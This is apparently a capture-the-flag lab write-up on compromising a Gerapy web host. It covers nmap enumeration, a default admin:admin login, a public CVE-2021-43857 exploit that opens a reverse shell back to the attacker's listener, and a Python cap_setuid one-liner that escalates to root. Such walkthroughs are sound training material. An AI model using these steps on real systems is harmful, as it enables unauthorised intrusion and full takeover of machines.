

#### Lab Details 

- Difficulty:  Easy
- Type: Web

#### Enumeration
- run `nmap`
```
$ nmap 192.168.115.24 -p- -sC -A --min-rate 1000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 02:26 -0700
Warning: 192.168.115.24 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.115.24
Host is up (0.18s latency).
Not shown: 64161 closed tcp ports (reset), 1372 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.38 seconds
```
- found that the target is running `http` on port 8000
- enumerate port 8000 identified web application `Gerapy`
- attempted login using default credential `admin:admin` able to login 

#### Initial Foothold 
 - search online and found authenticated RCE for `Gerapy` https://www.exploit-db.com/exploits/50640
- the exploit requires a project needs to be created, thus project created to accompany the exploit
![[Pasted image 20260328223137.png]]
- run the exploit and obtain a shell as user `app`
```
$ python3 gerapy_rce.py -t 192.168.54.24 -p 8000 -L 192.168.49.54 -P 4444                  
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: test
[*] Getting the ID of the project to build the URL
[*] Found ID of the project: 1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
connect to [192.168.49.54] from (UNKNOWN) [192.168.54.24] 60032
bash: cannot set terminal process group (845): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$ whoami
whoami
app
```
#### Lateral Movement (If any)

#### Privilege Escalation
- run `linpeas.sh`, found `python3.10` has `setuid` bit which can be used to perform privilege escalation
```
/usr/bin/python3.10 cap_setuid=ep
app@ubuntu:~$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'

ls
gerapy
linpeas.sh
local.txt
logs
run.sh
snap
whoami
root
cd /root
ls
email3.txt
proof.txt
snap

```
#### Resources

#### Lesson Learned